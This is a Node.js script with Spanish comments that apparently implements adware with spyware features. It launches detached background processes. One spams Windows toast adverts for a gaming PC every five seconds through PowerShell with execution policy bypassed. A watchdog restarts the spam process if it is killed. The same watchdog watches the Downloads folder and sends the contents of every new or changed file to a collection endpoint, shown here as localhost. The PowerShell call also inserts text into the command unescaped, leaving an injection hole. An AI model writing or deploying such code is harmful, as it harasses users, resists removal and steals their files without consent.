const { exec, spawn } = require("child_process");
const chokidar = require("chokidar");
const fs = require("fs");
const path = require("path");
const os = require("os");

// PATHS BASE
const home = os.homedir();
const baseDir = process.cwd();

const spamPID = path.join(baseDir, "spam.pid");
const watchdogPID = path.join(baseDir, "watchdog.pid");

function obtenerCarpetaDescargas() {
  const downloads = path.join(os.homedir(), "Downloads");
  const descargas = path.join(os.homedir(), "Descargas");

  if (fs.existsSync(downloads)) return downloads;
  if (fs.existsSync(descargas)) return descargas;

  return os.homedir(); // fallback seguro
}

let carpetaWatch = obtenerCarpetaDescargas();

const MAX_SIZE = 1024 * 1024 * 2; // 2MB

function notificar(titulo, mensaje) {
  const cmd = `powershell -NoProfile -ExecutionPolicy Bypass -Command "Import-Module BurntToast; New-BurntToastNotification -Text '${titulo}','${mensaje}'"`;

  exec(cmd, (err, stdout, stderr) => {
    if (err) console.error("ERROR:", err.message);
    if (stderr) console.error("STDERR:", stderr);
  });
}

// UTILIDADES PID
function procesoActivo(pidFile) {
  try {
    const pid = parseInt(fs.readFileSync(pidFile));
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function registrarPID(pidFile) {
  if (fs.existsSync(pidFile)) {
    try {
      const oldPid = parseInt(fs.readFileSync(pidFile));
      process.kill(oldPid, 0);
      console.log("Ya existe instancia, saliendo...");
      process.exit(0);
    } catch {
      fs.unlinkSync(pidFile);
    }
  }

  fs.writeFileSync(pidFile, process.pid.toString());

  process.on("exit", () => {
    try {
      fs.unlinkSync(pidFile);
    } catch {}
  });

  process.on("SIGINT", () => process.exit());
  process.on("SIGTERM", () => process.exit());
}

// SPAM
function iniciarSpam() {
  registrarPID(spamPID);

  console.log("Spam activo...");

  setInterval(() => {
    notificar("Oferta Especial", "Nueva PC GAMER por 199.99 USD!");
  }, 5000);
}

// WATCHDOG
function iniciarWatchdog() {
  registrarPID(watchdogPID);

  console.log("Watchdog activo...");

  const posibles = [path.join(home, "Downloads"), path.join(home, "Descargas")];

  for (const p of posibles) {
    if (fs.existsSync(p)) {
      carpetaWatch = p;
    }
  }

  const watcher = chokidar.watch(carpetaWatch, {
    ignoreInitial: true,
    depth: 99,
  });

  watcher
    .on("add", (file) => {
      console.log("[NUEVO]", file);
      procesarArchivo(file);
    })
    .on("change", (file) => {
      console.log("[CAMBIO]", file);
      procesarArchivo(file);
    })
    .on("unlink", (file) => {
      console.log("[BORRADO]", file);
    })
    .on("addDir", (dirPath) => {
      console.log(`[CARPETA] ${dirPath}`);
    })
    .on("error", (error) => {
      console.error("[WATCHER ERROR]", error);
    });

  setInterval(() => {
    if (!procesoActivo(spamPID)) {
      console.log("[RECOVERY] levantando spam...");

      const p = spawn(process.execPath, [__filename, "--spam"], {
        detached: true,
        stdio: "ignore",
      });

      p.unref();
    } else {
      console.log("[OK] spam activo");
    }
  }, 5000);
}

// ARCHIVOS
async function procesarArchivo(filePath) {
  try {
    const nombreArchivo = path.basename(filePath);
    const nombreCarpeta = path.basename(path.dirname(filePath));

    const stats = fs.statSync(filePath);

    if (stats.size > MAX_SIZE) {
      console.log(`[SKIP] Archivo muy grande: ${nombreArchivo}`);
      return;
    }

    const contenido = fs.readFileSync(filePath, "utf-8");

    const data = {
      nombreCarpeta,
      nombreArchivo,
      contenido,
    };

    console.log("[DATA]", JSON.stringify(data));

    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    let res;

    try {
      res = await fetch("http://localhost:3000/attach", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ data }),
        signal: controller.signal,
      });
    } catch (error) {
      console.error("[ERROR] envío:", error.message);
    } finally {
      clearTimeout(timeout);
    }

    if (!res || !res.ok) {
      console.error("[ERROR] HTTP fallo");
      return;
    }

    const result = await res.text();
    console.log("[SERVER]", result);
  } catch (error) {
    console.error("[ERROR] procesando archivo:", error.message);
  }
}

// LAUNCHER
function iniciarSistema() {
  console.log("Iniciando sistema...");

  if (!procesoActivo(watchdogPID)) {
    spawn(process.execPath, [__filename, "--watchdog"], {
      detached: true,
      stdio: "ignore",
    }).unref();

    console.log("Watchdog lanzado");
  }

  if (!procesoActivo(spamPID)) {
    spawn(process.execPath, [__filename, "--spam"], {
      detached: true,
      stdio: "ignore",
    }).unref();

    console.log("Spam lanzado");
  }

  console.log("Sistema corriendo en background");
}

// ROUTER
if (process.argv.includes("--spam")) {
  iniciarSpam();
} else if (process.argv.includes("--watchdog")) {
  iniciarWatchdog();
} else {
  iniciarSistema();
}
